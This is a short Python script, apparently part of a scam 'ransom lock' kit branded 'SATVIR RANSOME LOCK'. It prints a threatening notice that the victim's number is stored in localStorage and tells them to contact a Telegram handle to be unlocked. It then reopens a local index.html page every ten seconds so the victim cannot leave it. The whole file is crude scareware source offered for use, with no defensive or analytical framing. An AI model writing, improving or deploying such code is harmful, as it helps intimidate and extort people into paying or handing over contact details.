#!/usr/bin/env python3
# lock.py - Keeps user locked on website

import time
import webbrowser
import os
import sys

def lock_screen():
    print("🔒 SATVIR RANSOME LOCK")
    print("="*40)
    print("📱 Website: index.html")
    print("🔑 Your number is saved in localStorage")
    print("📞 Contact @notxsatvir on Telegram to unlock")
    print("="*40)
    print("\n⚠️ Press CTRL+C to exit (admin only)")
    
    # Open website
    webbrowser.open('index.html')
    
    try:
        while True:
            time.sleep(10)
            # Keep checking if browser closed
            # Re-open if closed
            webbrowser.open('index.html')
    except KeyboardInterrupt:
        print("\n🔓 Unlocked by admin")
        sys.exit(0)

if __name__ == "__main__":
    lock_screen()